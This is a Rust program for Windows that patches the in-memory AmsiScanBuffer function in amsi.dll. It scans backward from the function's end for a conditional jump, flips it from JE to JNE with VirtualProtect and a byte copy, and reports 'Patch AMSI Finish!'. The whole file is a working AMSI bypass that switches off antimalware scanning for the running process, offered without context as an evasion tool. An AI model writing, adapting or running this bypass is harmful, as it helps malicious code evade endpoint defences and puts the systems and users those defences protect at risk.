use std::ffi::{c_void, CString};
use windows::core::{s, PCSTR};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

fn main() {
    let amsi_buffer: *const u8 = CString::new("AmsiScanBuffer").unwrap().into_raw() as _;
    disable_amsi(amsi_buffer);
}

fn disable_amsi(function: *const u8) {
    unsafe {
        let hook: [u8; 1] = [0x75];
        let h_module = LoadLibraryA(s!("AMSI")).unwrap();
        let address = GetProcAddress(h_module, PCSTR(function)).expect("[!] GetProcAddress Failed");
        let address_ptr = address as *mut c_void;
        let mut count = 0;
        loop {
            let opcode_c3 = *(address_ptr as *const u8).add(count);
            let opcode_cc = *(address_ptr as *const u8).add(count + 1);
            let opcode_cc_2 = *(address_ptr as *const u8).add(count + 2);
            if opcode_c3 == 0xC3 && opcode_cc == 0xCC && opcode_cc_2 == 0xCC {
                break;
            }
            count += 1;
        }

        loop {
            let offset_ptr = address_ptr.add(count) as *const u8;
            if is_patchable(offset_ptr) {

                let mut old_protection = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(
                    offset_ptr as *mut c_void,
                    hook.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protection,
                ).unwrap_or_else(|e| {
                    panic!("[!] VirtualProtect Failed With Error: {e}");
                });

                std::ptr::copy_nonoverlapping(
                    hook.as_ptr(),
                    offset_ptr as _,
                    hook.len(),
                );

                VirtualProtect(
                    offset_ptr as *mut c_void,
                    hook.len(),
                    old_protection,
                    &mut old_protection,
                ).unwrap_or_else(|e| {
                    panic!("[!] VirtualProtect Failed With Error: {e}");
                });

                println!("[+] Patch AMSI Finish!");

                break;
            }
            count -= 1;
        }
    }
}

fn is_patchable(address: *const u8) -> bool{
    unsafe {
        let opcode = *(address as *const u8);
        if opcode != 0x74 {
            return false
        }
        let new_address = *(address.add(std::mem::size_of::<u8>()));
        let mov_address = address.add(std::mem::size_of::<u8>() * 2).add(new_address as usize);
        if *mov_address == 0xB8 {
            return true
        }
    }    
    false
}